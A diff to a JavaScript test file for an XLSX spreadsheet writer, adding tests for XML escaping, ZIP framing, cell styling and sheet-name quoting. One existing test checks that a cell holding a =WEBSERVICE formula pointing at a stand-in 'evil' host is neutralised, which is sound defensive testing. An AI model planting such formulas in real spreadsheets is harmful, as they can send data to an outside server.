@@ -6,7 +6,7 @@ import { writeXlsx, __internal } from '../../src/export/xlsx-writer.js'
 // consumed here so check-no-unused-exports does not flag it. It also gives direct coverage
 // of the CRC32 / zip-framing / escaping primitives that the end-to-end structural tests only
 // exercise indirectly.
-const { crc32, xmlEscape, colLetter, makeLocalHeader, makeCentralDirHeader, makeEocd } =
+const { crc32, xmlEscape, xmlAttrEscape, colLetter, makeLocalHeader, makeCentralDirHeader, makeEocd } =
   __internal
 
 describe('xlsx-writer __internal.crc32', () => {
@@ -33,6 +33,16 @@ describe('xlsx-writer __internal.xmlEscape', () => {
     expect(xmlEscape('a\x00b\x07c')).toBe('abc')
     expect(xmlEscape('a\x0bb')).toBe('ab') // 0x0B (VT) stripped
     expect(xmlEscape('line1\tline2\rline3\n')).toBe('line1\tline2\rline3\n')
+  })
+})
+
+describe('xlsx-writer __internal.xmlAttrEscape', () => {
+  it('escapes & < > " \' for attribute values (text-content escaper leaves quotes literal)', () => {
+    expect(xmlAttrEscape('a & b < c > d "e" \'f\'')).toBe(
+      'a &amp; b &lt; c &gt; d &quot;e&quot; &apos;f&apos;',
+    )
+    // Text-content escaper leaves quotes literal (valid in <t> bodies).
+    expect(xmlEscape('a & b < c > d "e" \'f\'')).toBe('a &amp; b &lt; c &gt; d "e" \'f\'')
   })
 })
 
@@ -91,6 +101,10 @@ describe('xlsx-writer writeXlsx (end-to-end)', () => {
     expect(xml).toContain('<t xml:space="preserve">Static analysis</t>')
     // Header cell carries the bold style (s="1").
     expect(xml).toMatch(/<c r="A1"[^>]*s="1"/)
+    // Data cells must NOT be bold — a writer that bolds every cell would still pass the
+    // header-only assertion above, so assert the data cell carries no `s` attribute.
+    expect(xml).toMatch(/<c r="A2" t="inlineStr">/)
+    expect(xml).not.toMatch(/<c r="A2"[^>]*s="1"/)
   })
 
   it('neutralizes a =WEBSERVICE note cell (defense-in-depth) on an inline-string cell', () => {
@@ -103,6 +117,33 @@ describe('xlsx-writer writeXlsx (end-to-end)', () => {
     // The real protection is t="inlineStr" (structurally text); the ' prefix is defense-in-depth.
     expect(xml).toContain('t="inlineStr"')
     expect(xml).toContain(`<t xml:space="preserve">'=WEBSERVICE("http://evil/x")</t>`)
+  })
+
+  it('EOCD points at a real central-directory header (end-to-end framing)', () => {
+    const buf = writeXlsx({ name: 'S', headers: ['a'], rows: [['x']] })
+    // EOCD is the last 22 bytes of the zip.
+    const eocd = buf.subarray(buf.length - 22)
+    expect(eocd.readUInt32LE(0)).toBe(0x06054b50) // PK\x05\x06
+    const cdOffset = eocd.readUInt32LE(16)
+    const cdSize = eocd.readUInt32LE(12)
+    const entryCount = eocd.readUInt16LE(10)
+    expect(entryCount).toBe(6) // 6 OOXML parts
+    // A central-directory signature must sit at cdOffset, and the EOCD must immediately
+    // follow the central directory (cdOffset + cdSize === start of EOCD).
+    expect(buf.readUInt32LE(cdOffset)).toBe(0x02014b50) // PK\x01\x02
+    expect(cdOffset + cdSize).toBe(buf.length - 22)
+  })
+
+  it('escapes a double-quote in the sheet name (attribute-safe workbook.xml)', () => {
+    const buf = writeXlsx({ name: 'Sheet "Q"', headers: ['a'], rows: [['x']] })
+    const wb = extract(buf, 'xl/workbook.xml').toString('utf8')
+    expect(wb).toContain('<sheet name="Sheet &quot;Q&quot;"')
+    // Must remain well-formed XML (no raw unescaped quote inside the attribute).
+    expect(wb).not.toMatch(/name="Sheet "Q""/)
+  })
+
+  it('throws on an empty headers array (no malformed <dimension>)', () => {
+    expect(() => writeXlsx({ name: 'S', headers: [], rows: [] })).toThrow(/header column/)
   })
 })
 
